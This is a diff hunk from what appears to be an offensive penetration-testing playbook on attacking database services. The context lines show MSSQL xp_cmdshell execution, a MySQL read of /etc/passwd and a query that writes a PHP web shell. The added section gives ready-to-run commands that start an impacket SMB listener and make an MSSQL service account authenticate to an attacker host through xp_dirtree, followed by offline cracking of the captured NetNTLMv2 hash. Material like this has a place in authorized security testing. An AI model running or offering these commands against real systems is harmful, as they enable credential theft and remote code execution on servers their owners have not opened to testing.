@@ -87,6 +87,24 @@ pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -X 'whoami'"   # xp_cmd
 MySQL with FILE privilege: `SELECT LOAD_FILE('/etc/passwd')` and
 `SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'`.
 
+**MSSQL with no privileges at all is still a credential primitive.** A login
+mapped to `guest` with no readable databases can usually still run the
+directory extended procedures, which make the *SQL service account*
+authenticate outbound to a UNC path you choose:
+
+```bash
+# listener first
+pwnloop x "python3 -u /usr/share/doc/python3-impacket/examples/smbserver.py share /engagements/<e>/www -smb2support"
+# then coerce — vary the share name on every retry, Windows negative-caches it
+pwnloop x "impacket-mssqlclient user:pass@$T <<< 'EXEC master.sys.xp_dirtree \"\\\\<tun0-ip>\\pwn01\", 1, 1;'"
+```
+
+`xp_dirtree`, `xp_fileexist` and `xp_subdirs` are all executable by `public` by
+default. The result is a NetNTLMv2 for the service account — crack it offline
+(`john --format=netntlmv2`), it cannot be relayed to a DC with signing
+required. If the listener prints nothing, do not assume failure: see
+`foothold.md` on reading the hash off the wire.
+
 ## Redis (6379)
 
 ```bash
